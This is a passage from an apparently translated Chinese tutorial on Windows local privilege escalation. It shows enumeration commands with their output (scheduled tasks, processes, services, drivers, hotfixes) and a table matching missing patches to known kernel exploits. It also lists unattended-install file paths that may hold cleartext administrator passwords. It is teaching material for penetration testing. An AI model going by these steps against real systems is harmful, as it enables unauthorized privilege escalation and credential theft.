config</div><div class="line"></div><div class="line">Domain profile configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Allowed programs configuration for Domain profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">Port configuration for Domain profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Domain profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Standard profile configuration (current):</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Service configuration for Standard profile:</div><div class="line">Mode     Customized  Name</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   No          Network Discovery</div><div class="line"></div><div class="line">Allowed programs configuration for Standard profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   Inbound              COMRaider / E:\comraider\comraider.exe</div><div class="line">Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe</div><div class="line"></div><div class="line">Port configuration for Standard profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Standard profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Log configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log</div><div class="line">Max file size   = 4096 KB</div><div class="line">Dropped packets = Disable</div><div class="line">Connections     = Disable</div></pre></td></tr></table></figure>
+<h4 id="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"><a href="#最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动" class="headerlink" title="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"></a>最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line"># This will display verbose output for all scheduled tasks, below you can see sample output for a</div><div class="line">single task.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</div><div class="line"></div><div class="line">Folder: \Microsoft\Windows Defender</div><div class="line">HostName:                             B33F</div><div class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</div><div class="line">Next Run Time:                        1/22/2014 5:11:13 AM</div><div class="line">Status:                               Ready</div><div class="line">Logon Mode:                           Interactive/Background</div><div class="line">Last Run Time:                        N/A</div><div class="line">Last Result:                          1</div><div class="line">Author:                               N/A</div><div class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</div><div class="line">                                      -WinTask -RestrictPrivilegesScan</div><div class="line">Start In:                             N/A</div><div class="line">Comment:                              Scheduled Scan</div><div class="line">Scheduled Task State:                 Enabled</div><div class="line">Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes</div><div class="line">Power Management:                     No Start On Batteries</div><div class="line">Run As User:                          SYSTEM</div><div class="line">Delete Task If Not Rescheduled:       Enabled</div><div class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</div><div class="line">Schedule:                             Scheduling data is not available in this format.</div><div class="line">Schedule Type:                        Daily</div><div class="line">Start Time:                           5:11:13 AM</div><div class="line">Start Date:                           1/1/2000</div><div class="line">End Date:                             1/1/2100</div><div class="line">Days:                                 Every 1 day(s)</div><div class="line">Months:                               N/A</div><div class="line">Repeat: Every:                        Disabled</div><div class="line">Repeat: Until: Time:                  Disabled</div><div class="line">Repeat: Until: Duration:              Disabled</div><div class="line">Repeat: Stop If Still Running:        Disabled</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line"># The following command links running processes to started services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; tasklist /SVC</div><div class="line"></div><div class="line">Image Name                     PID Services</div><div class="line">========================= ======== ============================================</div><div class="line">System Idle Process              0 N/A</div><div class="line">System                           4 N/A</div><div class="line">smss.exe                       244 N/A</div><div class="line">csrss.exe                      332 N/A</div><div class="line">csrss.exe                      372 N/A</div><div class="line">wininit.exe                    380 N/A</div><div class="line">winlogon.exe                   428 N/A</div><div class="line">services.exe                   476 N/A</div><div class="line">lsass.exe                      484 SamSs</div><div class="line">lsm.exe                        496 N/A</div><div class="line">svchost.exe                    588 DcomLaunch, PlugPlay, Power</div><div class="line">svchost.exe                    668 RpcEptMapper, RpcSs</div><div class="line">svchost.exe                    760 Audiosrv, Dhcp, eventlog,</div><div class="line">                                   HomeGroupProvider, lmhosts, wscsvc</div><div class="line">svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,</div><div class="line">                                   SysMain, TrkWks, UxSms, WdiSystemHost,</div><div class="line">                                   wudfsvc</div><div class="line">svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,</div><div class="line">                                   LanmanServer, MMCSS, ProfSvc, Schedule,</div><div class="line">                                   seclogon, SENS, ShellHWDetection, Themes,</div><div class="line">                                   Winmgmt, wuauserv</div><div class="line">audiodg.exe                    916 N/A</div><div class="line">svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,</div><div class="line">                                   WdiServiceHost, WinHttpAutoProxySvc</div><div class="line">svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,</div><div class="line">                                   NlaSvc</div><div class="line">spoolsv.exe                   1244 Spooler</div><div class="line">svchost.exe                   1272 BFE, DPS, MpsSvc</div><div class="line">mDNSResponder.exe             1400 Bonjour Service</div><div class="line">taskhost.exe                  1504 N/A</div><div class="line">taskeng.exe                   1556 N/A</div><div class="line">vmtoolsd.exe                  1580 VMTools</div><div class="line">dwm.exe                       1660 N/A</div><div class="line">explorer.exe                  1668 N/A</div><div class="line">vmware-usbarbitrator.exe      1768 VMUSBArbService</div><div class="line">TPAutoConnSvc.exe             1712 TPAutoConnSvc</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net start</div><div class="line"></div><div class="line">These Windows services are started:</div><div class="line"></div><div class="line">   Application Experience</div><div class="line">   Application Information</div><div class="line">   Background Intelligent Transfer Service</div><div class="line">   Base Filtering Engine</div><div class="line">   Bluetooth Support Service</div><div class="line">   Bonjour Service</div><div class="line">   COM+ Event System</div><div class="line">   COM+ System Application</div><div class="line">   Cryptographic Services</div><div class="line">   DCOM Server Process Launcher</div><div class="line">   Desktop Window Manager Session Manager</div><div class="line">   DHCP Client</div><div class="line">   Diagnostic Policy Service</div><div class="line">   Diagnostic Service Host</div><div class="line">   Diagnostic System Host</div><div class="line">   Distributed Link Tracking Client</div><div class="line">   Distributed Transaction Coordinator</div><div class="line">   DNS Client</div><div class="line">   Function Discovery Provider Host</div><div class="line">   Function Discovery Resource Publication</div><div class="line">   Group Policy Client</div><div class="line">[..Snip..]</div><div class="line">   </div><div class="line"># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</div><div class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; DRIVERQUERY</div><div class="line"></div><div class="line">Module Name  Display Name           Driver Type   Link Date</div><div class="line">============ ====================== ============= ======================</div><div class="line">1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM</div><div class="line">ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM</div><div class="line">AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM</div><div class="line">adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM</div><div class="line">adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM</div><div class="line">adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM</div><div class="line">AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM</div><div class="line">agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM</div><div class="line">aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM</div><div class="line">aliide       aliide                 Kernel        7/14/2009 7:11:17 AM</div><div class="line">amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM</div><div class="line">amdide       amdide                 Kernel        7/14/2009 7:11:19 AM</div><div class="line">AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM</div><div class="line">AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM</div><div class="line">amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM</div><div class="line">amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM</div><div class="line">amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM</div><div class="line">AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM</div><div class="line">arc          arc                    Kernel        5/25/2007 5:31:06 AM</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
+<h2 id="Δt-for-t4-The-Arcane-Arts-Of-WMIC"><a href="#Δt-for-t4-The-Arcane-Arts-Of-WMIC" class="headerlink" title="Δt for t4 - The Arcane Arts Of WMIC"></a>Δt for t4 - The Arcane Arts Of WMIC</h2><h4 id="我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"><a href="#我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。" class="headerlink" title="我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"></a>我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。</h4><h4 id="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："><a href="#下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：" class="headerlink" title="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："></a>下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：</h4><ul>
+<li>Windows WMIC Command Line (ComputerHope) - <a href="https://www.computerhope.com/wmic.htm" target="_blank" rel="external">here</a></li>
+</ul>
+<h4 id="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"><a href="#令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？" class="headerlink" title="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"></a>令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？</h4><h4 id="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"><a href="#为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。" class="headerlink" title="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"></a>为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</h4><h4 id="你可以从这里下载我的脚本"><a href="#你可以从这里下载我的脚本" class="headerlink" title="你可以从这里下载我的脚本"></a>你可以从这里<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="external">下载我的脚本</a></h4><h4 id="你也可以从这里下载我利用脚本收集的信息样本"><a href="#你也可以从这里下载我利用脚本收集的信息样本" class="headerlink" title="你也可以从这里下载我利用脚本收集的信息样本"></a>你也可以从这里下载我利用脚本收集的<a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="external">信息样本</a></h4><h2 id="Δt-for-t5-to-t6-Quick-Fails"><a href="#Δt-for-t5-to-t6-Quick-Fails" class="headerlink" title="Δt for t5 to t6 - Quick Fails"></a>Δt for t5 to t6 - Quick Fails</h2><h4 id="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了"><a href="#继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了" class="headerlink" title="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了."></a>继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了.</h4><h4 id="尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"><a href="#尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。" class="headerlink" title="尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"></a>尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line"></div><div class="line">Caption                                     Description      HotFixID   InstalledOn</div><div class="line">http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
+<h4 id="提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。"><a href="#提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。" class="headerlink" title="提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些:，大家可以下载对应版本的Windows 试试这些EXP。"></a>提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">常见的EXP有这些:</a>，大家可以下载对应版本的Windows 试试这些EXP。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#Security Bulletin   #KB     #Description    #Operating System  </div><div class="line">MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</div><div class="line">CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</div><div class="line">MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</div><div class="line">MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</div><div class="line">MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</div><div class="line">MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</div><div class="line">MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</div><div class="line">MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</div><div class="line">MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</div><div class="line">MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</div><div class="line">MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)</div><div class="line">MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</div><div class="line">MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)</div><div class="line">MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</div><div class="line">MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</div><div class="line">MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</div><div class="line">MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</div><div class="line">MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</div><div class="line">MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</div><div class="line">MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</div><div class="line">MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</div><div class="line">MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</div><div class="line">MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</div><div class="line">MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</div><div class="line">MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</div><div class="line">MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</div><div class="line">MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</div><div class="line">MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</div><div class="line">MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</div><div class="line">MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</div><div class="line">MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</div><div class="line">MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</div><div class="line">MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</div><div class="line">MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</div><div class="line">MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</div><div class="line">MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</div><div class="line">MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</div><div class="line">MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</div><div class="line">MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</div><div class="line">MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</div><div class="line">MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</div><div class="line">MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</div><div class="line">MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</div><div class="line">MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</div><div class="line">MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003)</div><div class="line">MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</div><div class="line">MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</div><div class="line">MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</div><div class="line">MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</div></pre></td></tr></table></figure>
+<h4 id="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"><a href="#下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。" class="headerlink" title="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"></a>下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。</h4><h4 id="通常这些敏感文件会出现在下面目录中："><a href="#通常这些敏感文件会出现在下面目录中：" class="headerlink" title="通常这些敏感文件会出现在下面目录中："></a>通常这些敏感文件会出现在下面目录中：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div></pre></td></tr></table></figure>
+<h4 id="这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例："><a href="#这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例：" class="headerlink" title="这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例："></a>这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div 